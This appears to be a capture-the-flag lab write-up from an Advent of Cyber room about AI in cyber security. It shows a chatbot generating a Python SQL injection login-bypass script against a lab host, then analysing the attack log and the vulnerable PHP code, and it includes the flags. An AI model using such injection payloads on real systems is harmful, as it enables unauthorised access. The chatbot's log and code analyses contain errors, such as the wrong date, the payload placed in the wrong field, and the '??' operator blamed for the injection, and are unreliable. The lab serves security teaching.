
# AI in Security - old sAInt nick

The lights glimmer and servers hum blissfully at The Best Festival Company (TBFC), melting the snow surrounding the data centre. TBFC has continued its pursuit of AI excellence. After the past two years, they realise that Van Chatty, their in-house chatbot, wasn’t quite meeting their standards. 

Unfortunately for the elves at TBFC, they are also not immune to performance metrics. The elves aim to find ways of increasing their velocity; something to manage the tedious, distracting tasks, which allows the elves to do the real magic. 

TBFC, adventurous as ever, is trialling their brand new cyber security AI assistant, Van SolveIT, which is capable of helping the elves with all their defensive, offensive, and software needs. They decide to put this flashy technology to use as Christmas approaches, to identify, confirm, and resolve any potential vulnerabilities, before any nay-sayers can.

## Learning Objectives

- How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
- Using an AI assistant to solve various tasks within cyber security
- Some of the considerations, particularly in cyber security, surrounding the use of AI


# Task 2 - AI for Cyber Security Showcase

## The Boom of AI Assistants

Ah, yes, artificial intelligence, that buzzword that seems here to stay. Who would have thought? Today’s room will highlight some ways AI is utilised in cyber security, along with important considerations to bear in mind when deploying AI for such tasks.

Particularly at the time of writing, AI is increasingly seen as a tool to boost speed by handling often tedious, time-consuming tasks, allowing humans to perform the real magic. Organisations want to see experience, not avoidance, in how these tools are operated.

GPT this, GPT that, we’ve all heard it often. And it’s likely to persist. As AI’s capabilities expand daily, we’ve observed a shift from AI being just “something to ask because you were too lazy to Google” (a mistake I’ve made myself). Now, AI is being embedded into everyday workflows, transforming how tasks are done and boosting productivity like never before. 

With that said, let’s begin today’s room!

## AI in Cyber Security

The use of artificial intelligence has seen a significant boost in cyber security. Visit almost any vendor, and they'll now have some form of AI powering a solution somewhere. Why? Well, it's not just because they're capitalising on the buzzword (although that's certainly _a part of it_), but rather, the benefits from artificial intelligence really do apply here. Let's explore some of these in the table below:

|   |   |
|---|---|
|**Features of AI**|**Cyber Security Relevance**|
|Processing large amounts of data|Analysing vast data from multiple types of sources. For example, system and network logs together.|
|Behaviour analysis|Tracking normal behaviour and activities over a period of time and flagging anything that is out of the ordinary.|
|Generative AI|Summarising or providing context behind a series of events.|

## Defensive Security

AI agents are being used in blue teaming to speed up detection, investigation, and response, making them quicker and more dependable. Acting like automated assistants, these agents continuously process telemetry (logs, network flows, endpoint signals) and add context to alerts. Furthermore, we are witnessing the integration of AI into vendor appliances—such as AI-assisted firewalling and intrusion detection systems.

Beyond just detecting threats, AI can also assist in automating responses. Picture your system automatically isolating an infected device, blocking a suspicious email, or flagging an unusual login attempt — all in real time.

## Offensive Security

AI agents have made a notable impact on offensive security by automating and handling the often very labourious and time-consuming tasks that a pentester might traditionally undertake. 

For example, AI can be a powerful tool in a penetration tester's workflow for reconnaissance and information gathering, from OSINT to analysing noisy scanner outputs and mapping attack surfaces. This allows the pentester to spend more time on the crucial tasks that require a human touch.

## Software

AI-driven software development, rightfully, sounds a bit frightening. Isn't that so? Well, you wouldn't be wrong to feel this way; we've all heard about the popularity of vibe coding and the vulnerabilities introduced by AI.

However, AI has proven to be a valuable addition to the software development process in several ways. One example is a virtual "colleague" to bounce ideas off while writing the code itself. More importantly, it is used as a SAST/DAST scanner. These scanners audit and analyse written code and applications for potential vulnerabilities. 

Yes, it's somewhat ironic. AI agents can be great at identifying vulnerabilities, but are not quite as effective at writing secure code.

## Considerations of AI In Cyber Security

Now, I’m not entirely here to sing the praises of AI and say it’s the silver bullet to all your needs. If you’ve used AI before, you’ll know the pitfalls and frustrations one can face. And nowhere is that truer than in cyber security.

While the usual considerations of using AI apply, such as not owning the output from AI, there are specific factors to consider before deploying it in cyber security.

One such consideration is the use of AI in activities like offensive penetration testing. While we have discussed some of AI's applications in these areas, caution remains essential. You do not want to explain to a client that their services and websites are down because an AI has caused a race condition or overwhelmed their systems.

We must think carefully about the data AI learns from, how transparent and fair its decisions are, and how reliable it remains when the unexpected occurs. We cannot assume the output from AI is 100% correct. Efforts must be made to verify the information it provides. Additionally, managing challenges such as keeping data private, securing AI models, and informing users properly requires careful consideration.

## Practical

Phew! Ready for an exciting exercise? You will be interacting with Van SolveIT, who will guide you through three showcases of how AI can be used in cyber security:

- **Red:** Generate and use an exploit script.
- **Blue:** Analyse web logs of an attack that has occurred.
- **Software:** Analyse source code for vulnerabilities.

When you're ready, you can access Van SolveIT at `http://10.64.161.79`. Remember, you will need to do so either from the AttackBox or your own device connected to the VPN.

_If you are on a small display, we recommend expanding the AttackBox into full screen mode which can be done by pressing the "two arrows" icon (left of the "+" icon) in the split-screen view to expand it into full screen._

## Usage Tips

- Chatbot responses may appear blank for a minute or two while it generates the reply. You will start to see Van SolveIT's responses in real time.
- If the chatbot gets confused at any time, press the **Restart Chat** button at the top right of the page.
- As you progress throughout the showcase, stages will unlock. You can go back to any stage that you have unlocked by clicking on the stage name on the top left.


## Van Solve IT

### Stage 1 - Introduction

AI Assistant
Welcome to the AI Showcase!

This interactive lab will showcase how AI can be used across three areas of cyber security:

Red Team - Discover how AI can be used to generate scripts to exploit vulnerabilities
Blue Team - See how AI can be used to analyse logs
Software Security - Harness the power of AI to review source code and identify how vulnerabilities are introduced

The showcases will unlock as you progress, but you can revisit any stage you have completed by clicking the stage name on the left.

When you are ready, press the blue 'Complete Stage to Continue' button on the left to progress.


### Stage 2 - Red Team

AI Assistant
Welcome to the Red Team showcase! I can help you generate Python scripts for the vulnerabilities within the web application of today's Advent of Cyber web application.

Shall we begin?
yes

AI Assistant
The vulnerability exists because the SQL injection attack exploits the username field by allowing the attacker to include malicious SQL code like "1=1 -- -". This OR condition bypasses SQL filters, enabling the attacker to include arbitrary SQL commands.

HOW TO SAVE THE FILE:
1. Open a terminal or text editor (e.g., Sublime Text).
2. Use nano script.py to create the file.
3. Paste the Python script into the file.
4. Save the file with Ctrl + O and exit.
5. Run python3 script.py to execute the exploit.

The script will automatically run the SQL injection attack on the target application. Let me know if you'd like further explanations!
AI Assistant
```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

```
python3 exploit.py p
Response Status Code: 200

Response Headers:
  Date: Thu, 04 Dec 2025 17:08:32 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>
        
        
        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        
        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>
    

```

### Stage 3: Blue Team

AI Assistant
Welcome to the Blue Team showcase! I'm your Blue Team Assistant. I can analyse logs and explain them.

Let's solve this stage together. You can ask me to analyse an example set of logs for the attack that we just performed!

```

AI Assistant
LOG ENTRIES
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

### 1. Analysis of the Logs
- IP Address: The user\u2019s IP address is 198.51.100.22, which indicates the location of the attacker.
- Time and Date: The attack occurred on 2025 October 8th at 09:03.
- URL: The login.php page was accessed, which is a common endpoint for user authentication.
- Username: The attacker used "alice" as the username, which was vulnerable to SQL injection.
- SQL Injection: The password parameter contains a SQL injection attempt: "alice%27+OR+1%3D1+--+-&password=test". This is a classic example of how an attacker can exploit a vulnerable input field to execute malicious SQL code.
- Vulnerability: This shows that the application is potentially vulnerable to SQL injection attacks.

---

### 2. Summary and Blue Team Perspective
Detecting such log entries helps blue team members understand potential vulnerabilities in the application. Logging malicious activity allows teams to identify and respond to threats, ensuring that applications are secure.

How to Use These Logs:
- Identify Risks: The SQL injection attempt highlights a critical weakness in the application\u2019s input validation.
- Improve Security: Redesign input validation to prevent such vulnerabilities.
- Enhance Monitoring: Continuously monitor logs to detect future attacks and improve application security.

Next Step: If you\u2019re ready, click "Complete Stage to Continue."
AI Assistant

198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"


```




### Stage 4: Software

AI Assistant
Welcome to the Software showcase! I can help you identify vulnerabilities in source code.

Shall we take a look at the source code of today's Advent of Cyber web application?


```

AI Assistant

<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

// Vulnerability: The code uses ?? to initialize variables, which does not prevent SQL injection due to improper input sanitization.



1. Identification of the specific vulnerability: The code initializes $user and $pass as empty strings using ??, which is not a secure practice. This allows attackers to inject malicious data directly into the database, leading to SQL injection.

2. Explanation of why the code is vulnerable: The ?? operator is not a secure way to initialize variables. If the input is not properly sanitized, it can be used to inject malicious SQL code. For example, if a user inputs admin in a username field, the code could execute commands in the database.

3. Best practices for preventing similar issues:
- Use prepared statements or parameterized queries to prevent SQL injection.
- Sanitize all user inputs before processing them.
- Validate and restrict input values to prevent injection attacks.

4. Tools and techniques for code security testing:
- Use tools like OWASP ZAP or SQLMap to detect injection vulnerabilities.
- Implement input validation and sanitization in your code.

Stage to Continue: Click the "Complete Showcase!" button.

```


 THM{AI_MANIA} 

